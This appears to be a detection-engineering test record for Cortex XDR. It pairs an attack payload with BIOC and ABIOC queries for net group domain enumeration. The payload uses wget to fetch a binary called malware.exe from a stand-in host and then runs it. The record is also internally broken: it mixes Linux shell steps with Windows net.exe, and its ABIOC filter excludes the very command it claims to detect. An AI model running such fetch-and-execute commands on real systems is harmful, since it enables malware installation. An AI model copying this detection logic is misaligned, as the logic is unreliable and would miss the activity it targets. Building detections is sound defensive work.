identity.description: An attacker executes the 'net group' command with uncommon parameters to enumerate domain groups, triggering the Cortex ABIOC for unusual command-line usage. This behavior is detected by analyzing process execution patterns and command-line arguments.

payload.code:
cd /tmp
wget http://192.0.2.50/malware.exe -O malicious.exe
chmod +x malicious.exe
./malicious.exe
net group "Domain Admins" /domain

expected_artifacts.description: Execution of net.exe with group enumeration arguments

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Net Group Command Execution
biocs.description: Detection of net.exe being executed with group enumeration arguments not seen in normal operations
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'net.exe'
| filter action_file_path contains 'net.exe'
| filter action_command_line contains 'group' and action_command_line contains '/domain'

abiocs.name: Behavioral Net Group Command Deviation
abiocs.description: ML-based anomaly detection of net.exe usage with group enumeration that deviates from baseline behavior
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'net.exe'
| filter action_command_line contains 'group' and action_command_line contains '/domain'
| filter not in (action_command_line, ["net group 'Domain Admins' /domain"])
